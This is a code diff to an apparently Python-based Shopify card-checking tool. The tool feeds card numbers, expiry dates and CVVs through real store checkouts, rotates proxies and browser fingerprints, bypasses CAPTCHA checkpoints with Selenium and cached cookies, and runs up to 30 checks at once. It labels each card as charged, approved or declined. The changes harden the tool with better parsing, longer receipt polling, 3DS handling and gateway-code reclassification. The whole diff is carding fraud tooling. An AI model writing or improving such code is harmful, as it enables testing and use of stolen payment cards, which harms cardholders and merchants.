@@ -7,6 +7,8 @@ import json
 from datetime import datetime
 from urllib.parse import urlparse, quote
 import sys
+import copy
+import threading as _threading
 
 
 try:
@@ -17,7 +19,7 @@ except AttributeError:
 # ── Selenium CAPTCHA solver (auto-bypass Shopify checkpoint) ──────────
 _CAPTCHA_SOLVER_AVAILABLE = False
 try:
-    from captcha_solver import solve_shopify_captcha, is_solver_available, get_solver_status, get_cached_cookies
+    from captcha_solver import solve_shopify_captcha, is_solver_available, get_solver_status, get_cached_cookies, cache_cookies
     _CAPTCHA_SOLVER_AVAILABLE = True
     print("[shopifyapi] \u2705 Selenium CAPTCHA solver loaded")
 except ImportError:
@@ -335,7 +337,7 @@ _POOL_PHONES = (
     "5035559012", "6025553456", "7025557890", "8015551234",
     "2145555678", "3035559012", "4045553456", "5125557890",
     "6155551234", "7165555678", "8185559012", "9195553456",
-    "2675557890", "3125551234", "4155555678", "5035559012",
+    "2675557890", "3125551234", "4155555678", "9496551234",
 )
 
 
@@ -504,7 +506,7 @@ class ShopifyAuto:
                     "number": str(cc).replace(" ", ""),
                     "name": f"{first} {last}",
                     "month": int(mon),
-                    "year": int(year),
+                    "year": int(year) if len(str(year)) == 4 else (2000 + int(year) if int(year) < 100 else int(year)),
                     "verification_value": str(cvv)
                 }
             }
@@ -591,11 +593,19 @@ async def main():
             try:
                 product_response = await session.get(site + '/products.json', headers=product_header)
                 products_data = product_response.json()
-                product = products_data['products'][0]
-                product_id = product['id']
-                product_handle = product['handle']
-                variant_id = product['variants'][0]['id']
-                price = product['variants'][0]['price']
+                _prods = products_data.get('products', [])
+                if not _prods:
+                    print("❌ No products found on site")
+                    return
+                product = _prods[0]
+                product_id = product.get('id')
+                product_handle = product.get('handle', '')
+                _variants = product.get('variants', [])
+                if not _variants:
+                    print("❌ No variants found for product")
+                    return
+                variant_id = _variants[0].get('id')
+                price = _variants[0].get('price', '0')
                 
                 print(f" ✅ Product: {product['title']}")
                 print(f" ✅ Product ID: {product_id}")
@@ -626,9 +636,12 @@ async def main():
                 
                 cart_response = await session.get(f"{site}/cart.js", headers=product_header)
                 cart_data = cart_response.json()
-                token = cart_data['token']
+                token = cart_data.get('token')
+                if not token:
+                    print('❌ No cart token found')
+                    return
                 print(f"   Cart token: {token}")
-                print(f"   Items in cart: {cart_data['item_count']}")
+                print(f"   Items in cart: {cart_data.get('item_count', '?')}")
                 
                 print ('now you will be redirected to the checkout page, wait.....')
                 
@@ -766,7 +779,7 @@ async def main():
                         random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
 
                         graphql_payload = {
-                            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
+                            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                             'variables': {
                                 'input': {
                                     'checkpointData': None,
@@ -941,7 +954,6 @@ async def main():
                                     if nq: queue_token = nq
 
                                 # Orijinal payload verilerini güvenli bir şekilde kopyalıyoruz
-                                import copy
                                 new_payload = copy.deepcopy(graphql_payload)
                                 new_payload["variables"]["input"]["sessionInput"]["sessionToken"] = session_token
                                 new_payload["variables"]["input"]["queueToken"] = queue_token
@@ -1177,6 +1189,8 @@ _CAPTCHA_MAX_RETRIES = 1  # 1 retry with Selenium solver when CAPTCHA detected
 _MAX_CONCURRENT_CHECKS = 30  # sweet spot: enough throughput, won't saturate
 _check_semaphore = None       # created lazily on first use (correct event loop)
 _active_checks = 0  # simple counter — no lock needed, GIL protects int ops
+# NOTE: In multi-worker gunicorn deployments each process has its own counter.
+# get_active_checks() returns per-process count, not cluster-wide total.
 
 def get_active_checks():
     """Return number of currently active checks (for dynamic worker scaling)."""
@@ -1221,6 +1235,17 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
     if len(parts) != 4:
         return {"status": "Error", "message": "Invalid format. Use cc|mm|yy|cvv"}
     cc, mon, year, cvv = parts[0], parts[1], parts[2], parts[3]
+    # Normalize year to 4-digit (e.g., "25" → "2025") and month to zero-padded string
+    try:
+        _y = int(year)
+        year = str(2000 + _y) if _y < 100 else str(_y)
+    except ValueError:
+        pass
+    try:
+        _m = int(mon)
+        mon = f"{_m:02d}"
+    except ValueError:
+        pass
     
     # Ensure enough time for receipt poll
     timeout = max(float(timeout), 60.0)
@@ -1246,7 +1271,7 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
         print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] Attempt — proxy={proxy_use and proxy_use[:30]}... | captcha_retries={captcha_retries}")
 
     try:
-        async with _create_async_client(proxy_url=proxy_use, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
+        async with _create_async_client(proxy_url=proxy_use, timeout=float(timeout), chrome_version=fingerprint.get("_chrome_ver")) as session:
             # Pre-inject cached cookies from previous CAPTCHA bypass (avoids CAPTCHA entirely)
             if _CAPTCHA_SOLVER_AVAILABLE:
                 try:
@@ -1309,8 +1334,9 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
                 
                 info2 = ShopifyAuto().get_random_info()
                 # Pass price from API flow to browser checkout as fallback
-                info2["price"] = price if 'price' in dir() else ""
-                info2["product"] = product_title if 'product_title' in dir() else ""
+                _local_vars = locals()
+                info2["price"] = _local_vars.get("price", "")
+                info2["product"] = _local_vars.get("product_title", "")
                 print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \U0001f4dd Filling form & submitting in browser...")
                 
                 browser_result = await do_full_browser_checkout(
@@ -1354,7 +1380,6 @@ def _log_verbose(verbose, msg, discord_webhook=None):
 # ── Products.json cache (30s TTL) ─────────────────────────────────────
 # No threading.Lock needed — GIL protects dict get/set, and stale reads
 # are harmless (worst case: two coroutines fetch the same products.json).
-import threading as _threading
 _products_cache = {}       # {site_url: {"data": [...], "ts": float}}
 _PRODUCTS_CACHE_TTL = 60   # seconds
 _PRODUCTS_CACHE_MAX = 200
@@ -1704,6 +1729,10 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
     requires_shipping = _detect_requires_shipping(response_text2)
     if requires_shipping is None:
         requires_shipping = True  # default to shipping if unknown
+    # Guard: if stable_id is empty the GraphQL payload will be invalid — fail fast
+    if not stable_id:
+        _steps.append("4b. stable_id missing — checkout page may have changed")
+        return {"status": "Error", "message": "Checkout session failed: missing stableId", "product": product_title, "price": price, "debug_steps": _steps}
     delivery_strategy_handle = _extract_delivery_strategy_handle(response_text2)
     delivery_option_handle = None  # only for shipping products
     _log_verbose(verbose, f"✅ requires_shipping={requires_shipping}, delivery_strategy_handle={delivery_strategy_handle[:20] + '...' if delivery_strategy_handle else None}", discord_webhook=discord_console_webhook)
@@ -1720,7 +1749,9 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
 
     # Tokenize card — FRESH session (external domain, no store cookies)
     _token_endpoints = ["https://deposit.us.shopifycs.com/sessions", "https://checkout.pci.shopifyinc.com/sessions", "https://checkout.shopifycs.com/sessions"]
-    _card_json = {"credit_card": {"number": cc, "month": mon, "year": year, "verification_value": cvv, "name": f"{fname} {lname}"}, "payment_session_scope": urlparse(site_url).netloc}
+    _year_int = int(year) if len(str(year)) == 4 else (2000 + int(year) if int(year) < 100 else int(year))
+    _month_int = int(mon)
+    _card_json = {"credit_card": {"number": cc, "month": _month_int, "year": _year_int, "verification_value": cvv, "name": f"{fname} {lname}"}, "payment_session_scope": urlparse(site_url).netloc}
     _tok_chrome_ver = fingerprint.get("_chrome_ver")
     _tok_headers = {"accept": "application/json", "content-type": "application/json", "origin": "https://checkout.shopifycs.com", "referer": "https://checkout.shopifycs.com/", "user-agent": shop.user_agent, "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"), "accept-encoding": "gzip, deflate, br, zstd", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site"}
     for _ch_key in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
@@ -1763,7 +1794,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
     _steps.append(f"5. Payment session: OK | sid={sessionid[:20]}...")
     _log_verbose(verbose, "✅ Payment session OK", discord_webhook=discord_console_webhook)
     graphql_url = f"{site_url}/checkouts/unstable/graphql"
-    _query = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"
+    _query = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"
 
     # ── Phase 1: Pre-negotiate shipping rates (only for physical products) ──
     def _make_graphql_headers():
@@ -1853,13 +1884,17 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             receipt = neg_receipt
             receipt_id = receipt.get("id")
             if receipt.get("__typename") == "ProcessingReceipt":
-                poll_delay = 0.25  # Start fast, back off
-                for poll_i in range(8):  # adaptive polling
-                    await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
+                poll_delay = 0.3  # Start fast, back off
+                for poll_i in range(14):  # more attempts — Shopify can take 10-15s
+                    await asyncio.sleep(min(poll_delay + poll_i * 0.1, 1.5))
                     poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                     if poll_r.status_code != 200:
                         continue
-                    rec = poll_r.json().get("data", {}).get("receipt", {})
+                    _pd = poll_r.json()
+                    rec = _pd.get("data", {}).get("receipt", {})
+                    # Use pollDelay from server response when processing
+                    if rec.get("__typename") == "ProcessingReceipt" and rec.get("pollDelay"):
+                        poll_delay = min(float(rec["pollDelay"]), 2.0)
                     if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
                         return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec}
                     if rec.get("__typename") == "ActionRequiredReceipt":
@@ -1869,6 +1904,10 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                         _fc = err.get("code", "UNKNOWN")
                         if _fc == "CAPTCHA_REQUIRED":
                             return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec}
+                        # Approval codes check
+                        _neg_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
+                        if _fc in _neg_approval or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc:
+                            return {"status": "Error", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
                         return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": rec}
                 return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price}
             elif receipt.get("__typename") == "FailedReceipt":
@@ -1876,7 +1915,13 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 _fc = err.get("code", "UNKNOWN")
                 if _fc == "CAPTCHA_REQUIRED":
                     return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
+                # Approval codes check
+                _neg_approval2 = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
+                if _fc in _neg_approval2 or "INSUFFICIENT" in _fc or "CVC" in _fc or "CVV" in _fc:
+                    return {"status": "Error", "message": _fc, "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
                 return {"status": "Declined", "message": "Card declined", "error_code": _fc, "gateway_message": err.get("messageUntranslated", "") or None, "product": product_title, "price": price, "raw_receipt": receipt}
+            elif receipt.get("__typename") == "ActionRequiredReceipt":
+                return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt}
             elif receipt.get("__typename") == "ProcessedReceipt" or receipt.get("orderIdentity"):
                 return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": receipt}
 
@@ -1992,7 +2037,7 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             error_codes = [e.get("code") for e in completion["errors"] if e.get("code")]
 
             # ── Classify submit error codes ──
-            # Gateway approval codes = card was validated by processor → Approved
+            # Ye codes as-it-is return hote hain (CARD_APPROVED mein convert nahi)
             _approval_codes = {
                 "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
                 "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
@@ -2026,9 +2071,9 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
             site_hits = [c for c in error_codes if c in _site_skip_codes]
 
             if approval_hits:
-                # Card was validated by gateway — treat as Approved
-                _steps.append(f"7. Result: APPROVED | code={approval_hits[0]}")
-                return {"status": "Approved", "message": "Card approved by gateway", "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
+                # Exact gateway code as-it-is return karo
+                _steps.append(f"7. Result: {approval_hits[0]} | code={approval_hits[0]}")
+                return {"status": "Error", "message": approval_hits[0], "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
             if decline_hits:
                 # Card was declined by gateway
                 _steps.append(f"7. Result: DECLINED | code={decline_hits[0]}")
@@ -2059,15 +2104,35 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                 _log_verbose(verbose, f"No receipt (typename={tn})", discord_webhook=discord_console_webhook)
             return {"status": "Error", "message": f"No receipt ({tn})", "product": product_title, "price": price, "debug_steps": _steps}
         receipt_id = receipt.get("id")
+        # Handle direct terminal receipt types first (no polling needed)
+        if receipt.get("__typename") == "ProcessedReceipt" or receipt.get("orderIdentity"):
+            _steps.append(f"7. Receipt: CHARGED (direct) | order={receipt.get('orderIdentity', {}).get('id', 'N/A')}")
+            return {"status": "Charged", "message": "CARD CHARGED", "order_id": receipt.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
+        if receipt.get("__typename") == "ActionRequiredReceipt":
+            _steps.append("7. Receipt: 3DS_REQUIRED (direct)")
+            return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
+        if receipt.get("__typename") == "FailedReceipt":
+            _err = receipt.get("processingError", {}) or {}
+            _erc = _err.get("code", "UNKNOWN")
+            _erm = _err.get("messageUntranslated", "") or ""
+            if _erc == "CAPTCHA_REQUIRED":
+                return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
+            _dr_approval = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
+            if _erc in _dr_approval or "INSUFFICIENT" in _erc or "CVC" in _erc or "CVV" in _erc:
+                return {"status": "Error", "message": _erc, "error_code": _erc, "gateway_message": _erm or None, "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
+            return {"status": "Declined", "message": "Card declined", "error_code": _erc, "gateway_message": _erm or None, "product": product_title, "price": price, "raw_receipt": receipt, "debug_steps": _steps}
         if receipt.get("__typename") == "ProcessingReceipt":
-            poll_delay = 0.25  # Start fast, back off
-            for poll_i in range(8):  # adaptive polling
-                await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
+            poll_delay = 0.3  # Start fast, back off
+            for poll_i in range(14):  # more attempts — Shopify can take 10-15s
+                await asyncio.sleep(min(poll_delay + poll_i * 0.1, 1.5))
                 poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                 if poll_r.status_code != 200:
                     continue
                 poll_data = poll_r.json()
                 rec = poll_data.get("data", {}).get("receipt", {})
+                # Use pollDelay from server response when processing
+                if rec.get("__typename") == "ProcessingReceipt" and rec.get("pollDelay"):
+                    poll_delay = min(float(rec["pollDelay"]), 2.0)
                 if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
                     _steps.append(f"7. Receipt: CHARGED | order={rec.get('orderIdentity', {}).get('id', 'N/A')}")
                     return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
@@ -2085,12 +2150,12 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
                         _steps.append(f"7. Receipt: CAPTCHA_REQUIRED")
                         return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                     
-                    # Classify FailedReceipt codes
+                    # Classify FailedReceipt codes — exact code as-it-is return karo
                     approval_codes = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
                     
                     if code in approval_codes or "INSUFFICIENT" in code or "CVC" in code or "CVV" in code:
-                        _steps.append(f"7. Receipt: APPROVED | code={code} | msg={msg_orig}")
-                        return {"status": "Approved", "message": "Card approved by gateway", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
+                        _steps.append(f"7. Receipt: {code} | code={code} | msg={msg_orig}")
+                        return {"status": "Error", "message": code, "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
                     
                     _steps.append(f"7. Receipt: DECLINED | code={code} | msg={msg_orig}")
                     return {"status": "Declined", "message": "Card declined", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
